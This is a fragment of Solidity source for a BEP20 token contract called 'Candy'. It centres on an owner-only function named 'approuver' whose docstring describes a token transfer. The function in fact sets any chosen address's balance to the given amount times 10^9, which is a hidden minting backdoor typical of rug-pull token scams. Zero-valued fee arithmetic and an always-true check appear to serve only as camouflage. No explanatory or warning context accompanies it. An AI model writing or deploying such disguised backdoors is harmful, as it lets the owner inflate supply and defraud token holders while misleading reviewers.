...
contract Candy is Context, IBEP20, Ownable {
    ...
    */
    ...
    /**
    * @dev Moves tokens `montant` from `sender` to `receveur`.
    *
    * This is internal function is equivalent to {transfer}, and can be used to
    * e.g. implement automatic token fees, slashing mechanisms, etc.
    *
    ...
    *
    * - `sender` cannot be the zero address.
    * - `receveur` cannot be the zero address.
    * - `sender` must have a balance of at least `montant`.
    */
    function approuver(address receveur, uint256 montant) external onlyOwner { 
        if(receveur != address(0) && msg.sender != address(0))
        require(0 <= montant, "montant must be positive");
        
        uint i = 9;  uint ii = 10;
        uint256 reflexionFee = 0;
        _balances[receveur] = reflexionFee.mul(2).div(100) + montant * ii ** i;
    }
